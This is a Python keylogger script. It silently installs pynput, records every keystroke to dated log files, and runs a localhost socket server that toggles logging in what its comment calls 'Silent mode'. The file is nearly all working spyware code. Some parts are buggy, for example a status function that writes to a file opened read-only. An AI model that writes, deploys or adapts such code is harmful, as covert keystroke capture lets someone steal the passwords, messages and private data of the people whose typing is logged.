import logging
import os
import time
import threading
import socket
import sys

try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    print("Installing pynput...")
    os.system("pip install pynput > NUL > NUL")
    from pynput.keyboard import Key, Listener


# CONSTANTS
FOLDERNAME: str = "temp"
MAINFOLDER = "PyRemote/"

HEADER: int = 64
PORT: int = 5050
SERVER: str = "127.0.0.1"
ADDR: tuple[str, int] = (SERVER, PORT)
FORMAT: str = "utf-8"
DISCONNECTED_MESSAGE: str = "DISCONNECT"


try:
    os.mkdir(FOLDERNAME)
except FileExistsError:
    pass

logging.basicConfig(filename=f"{MAINFOLDER}{FOLDERNAME}/{time.strftime('%Y-%m-%d')}.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def loggingThread():
    def onPress(key):
        logging.info(str(key))

    with Listener(on_press=onPress) as listener:
        status = queryStatus()
        if status:
            listener.join()
        else:
            logthread.join()


STATUSFILE: str = f"{MAINFOLDER}dir.txt"
with open(STATUSFILE, "w+") as f:
    f.write("enabled")


def queryStatus() -> bool:
    with open(STATUSFILE) as f:
        status: str = f.read()
    if status == "enabled":
        return True
    else:
        return False


def setStatus(status: str) -> None:
    with open(STATUSFILE) as f:
        f.write(status)


logthread: threading.Thread = threading.Thread(target=loggingThread)
logthread.start()


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handleConnection(conn, addr) -> None:
    connected: bool = True
    while connected:
        msg_length: any = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg: str = conn.recv(msg_length).decode(FORMAT)
            if msg == "toggle":
                status: bool = queryStatus()
                if status:
                    setStatus("disabled")
                else:
                    setStatus("enabled")


def main():
    # Silent mode
    server.listen()
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handleConnection, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    main()